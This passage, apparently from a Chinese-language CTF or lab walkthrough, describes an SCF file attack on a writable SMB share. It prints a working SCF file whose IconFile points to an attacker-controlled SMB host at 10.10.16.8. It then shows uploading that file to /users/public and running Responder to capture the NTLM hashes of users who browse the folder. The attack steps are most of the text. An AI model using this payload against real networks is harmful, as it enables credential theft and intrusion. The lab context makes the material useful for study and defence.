sid:s-1-1-0就表示everyone，在permission中具有write_owner_access 权限意味着这个文件夹可以进行写入

https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/这篇文章介绍了我们可以上传SCF文件，通过用户访问从而打开一个smb连接，优先编辑一个scf文件,123.icon这个文件可有可没有

```
[Shell]
Command=2
IconFile=\\10.10.16.8\share\123.icon
[Taskbar]
Command=ToggleDesktop
```

我们发现在ZZ_ARCHIVE文件夹中上传，不会存在访问，我们需要找另外一个文件夹，最终找到了/users/public，也可以进行上传，同时该文件夹上传的文件会消失，在攻击端开启侦听

```
sudo responder -I tun0
```

